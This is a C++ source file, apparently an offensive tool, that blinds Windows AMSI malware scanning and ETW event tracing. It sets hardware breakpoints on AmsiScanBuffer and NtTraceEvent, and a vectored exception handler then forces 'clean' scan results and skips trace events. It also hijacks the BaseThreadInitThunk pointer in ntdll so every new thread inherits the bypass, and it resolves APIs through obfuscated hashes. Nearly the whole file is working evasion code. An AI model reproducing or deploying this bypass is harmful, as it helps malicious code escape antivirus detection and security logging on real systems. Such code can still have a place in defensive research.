#include <iostream>
#include <Windows.h>
#include <amsi.h>

#include "Common.h"
#include "Native.h"

#pragma comment(lib, "Ntdll.lib")

typedef void (WINAPI* ExecBaseThreadInitThunk)(long, void*, void*);

typedef struct _INSTANCE {
	struct {
		void* Amsi;
		void* Kernel32;
		void* Ntdll;
	} Module;

	struct {
		void* NtTraceEvent;
		ExecBaseThreadInitThunk	BaseThreadInitThunk;
		void* OgBaseThreadInitThunk;
		void* AmsiScanBuffer;
	} Function;
} INSTANCE, * PINSTANCE;


INSTANCE Inst = { 0 };

/*
	DR0	: AmsiScanBuffer
	DR1 : NtTraceEvent
*/

DWORD64 dwFindRetInstruction(
	_In_	DWORD64		dwAddr
)
{
	for (int i = 0; ; i++)
	{
		if (
			((PBYTE)dwAddr + i)[0] == 0xC3
			)
		{
			return (DWORD64)(dwAddr + i);
		}
	}

	return 0;
}

long	VehHandler(
	_In_	PEXCEPTION_POINTERS		ExceptionInfo
)
{
	if (
		ExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP
		)
	{
		return EXCEPTION_CONTINUE_SEARCH;
	}

#ifdef _DEBUG
	printf("VEH HANDLER HWBP HIT !!\n");
#endif

	void* ExceptionAddress = reinterpret_cast<void*>(ExceptionInfo->ContextRecord->Rip);

	if (ExceptionAddress == Inst.Function.AmsiScanBuffer)
	{
		ExceptionInfo->ContextRecord->Rax = S_OK;
		*reinterpret_cast<PULONG_PTR>(ExceptionInfo->ContextRecord->Rsp + 0x30) = AMSI_RESULT_CLEAN;
		ExceptionInfo->ContextRecord->Rip = dwFindRetInstruction((DWORD64)ExceptionAddress);
		ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
		return EXCEPTION_CONTINUE_EXECUTION;

	}

	if (ExceptionAddress == Inst.Function.NtTraceEvent)
	{
		ExceptionInfo->ContextRecord->Rax = STATUS_SUCCESS;
		ExceptionInfo->ContextRecord->Rip = dwFindRetInstruction((DWORD64)ExceptionAddress);
		ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
		return EXCEPTION_CONTINUE_EXECUTION;

	}

	return EXCEPTION_CONTINUE_SEARCH;
}



bool PutHwbp(
	_In_	void* FunctionAddress1,
	_In_	void* FunctionAddress2
)
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	RtlCaptureContext(&ctx);

	ctx.Dr0 = reinterpret_cast<DWORD64>(FunctionAddress1);
	ctx.Dr1 = reinterpret_cast<DWORD64>(FunctionAddress2);

	ctx.Dr7 |= (1 << 0);   // Local DR0 breakpoint
	ctx.Dr7 |= (1 << 2);   // Local DR1 breakpoint

	ctx.Dr7 &= ~(1 << 16); // break on execution - Dr0
	ctx.Dr7 &= ~(1 << 17);

	ctx.Dr7 &= ~(1 << 20); // break on execution - Dr1
	ctx.Dr7 &= ~(1 << 21);

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	
	NTSTATUS status = NtContinue(&ctx, false);
	if (NT_ERROR(status))
	{
		return false;
	}
	else
	{
		return true;
	}


}


void Hook_BaseThreadInitThunk(
	_In_	DWORD LdrReserved,
	_In_	LPTHREAD_START_ROUTINE lpStartAddress,
	_In_	LPVOID lpParameter
)
{

#ifdef _DEBUG
	printf("[NEW THREAD] TID : %d\n", GetCurrentThreadId());
#endif
	if (!PutHwbp(Inst.Function.AmsiScanBuffer, Inst.Function.NtTraceEvent))
	{
#ifdef _DEBUG
		printf("[!] Can't set HWBP !\n");
#endif
	}

	Inst.Function.BaseThreadInitThunk(LdrReserved, lpStartAddress, lpParameter);
}

/*
	Init HWBP Hook,	also hook all created thread
	Return the og content of data section in ntdll
*/

bool PrepareHook()
{
	std::string AmsiModuleName = "amsi.dll";

	Inst.Module.Amsi = Obf::Load(const_cast<char*>(AmsiModuleName.c_str())); 
	Inst.Module.Kernel32 = Win32::RtlGetModuleAddressWithHash(ctime_HashStrA("Kernel32.dll"));	
	Inst.Module.Ntdll = Win32::RtlGetModuleAddressWithHash(ctime_HashStrA("Ntdll.dll"));

	if (
		!Inst.Module.Amsi ||
		!Inst.Module.Kernel32 ||
		!Inst.Module.Ntdll
		)
	{
		return false;
	}

	Inst.Function.BaseThreadInitThunk = (ExecBaseThreadInitThunk)Win32::RtlGetProcedureAddressWithHash(Inst.Module.Kernel32, ctime_HashStrA("BaseThreadInitThunk"));			
	Inst.Function.AmsiScanBuffer = Win32::RtlGetProcedureAddressWithHash(Inst.Module.Amsi, ctime_HashStrA("AmsiScanBuffer"));
	Inst.Function.NtTraceEvent = Win32::RtlGetProcedureAddressWithHash(Inst.Module.Ntdll, ctime_HashStrA("NtTraceEvent"));  

	if (
		!Inst.Function.BaseThreadInitThunk ||
		!Inst.Function.AmsiScanBuffer ||
		!Inst.Function.NtTraceEvent
		)
	{
		return false;
	}

	if (!Inst.Module.Ntdll)
		return false;

	void* SectionAddress = nullptr;
	long	SectionSize = 0;

	if (!
		Win32::RtlGetSectionInformationWithHash(Inst.Module.Ntdll, &SectionAddress, &SectionSize, ctime_HashStrA(".data"))
		)
	{
		return false;
	}

	for (int i = 0; i < SectionSize; i++)
	{
		if (
			((void**)SectionAddress)[i] == Inst.Function.BaseThreadInitThunk
			)
		{
#ifdef _DEBUG
			printf("[!] FOUND at : %p\n", (void*)((char*)SectionAddress + i));
#endif
			Inst.Function.OgBaseThreadInitThunk = &((void**)SectionAddress)[i];
			Win32::RtlAtomicExchange(Inst.Function.OgBaseThreadInitThunk, (PVOID)&Hook_BaseThreadInitThunk);

#ifdef _DEBUG
			printf("[MAIN THREAD] TID : %d\n", GetCurrentThreadId());
#endif
			if (!PutHwbp(Inst.Function.AmsiScanBuffer, Inst.Function.NtTraceEvent))
			{
#ifdef _DEBUG
				printf("[!] Can't set HWBP !\n");
#endif 
				return false;
			}

			return true;

		}
	}
	return true;
}

/*
	Cleanup DR register, restore the original content of .data in ntdll and remove the VEH Handler
*/
bool CleanUp()
{
	CONTEXT ctx = { 0 };
	ctx.Dr0 = 0;
	ctx.Dr1 = 0;
	ctx.Dr2 = 0;
	ctx.Dr7 = 0;

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	Win32::RtlAtomicExchange(Inst.Function.OgBaseThreadInitThunk, Inst.Function.BaseThreadInitThunk);
	NtContinue(&ctx, false);

	if (RemoveVectoredExceptionHandler(&VehHandler) != 0)
	{
		return false;
	}
	else
	{
		return true;
	}
}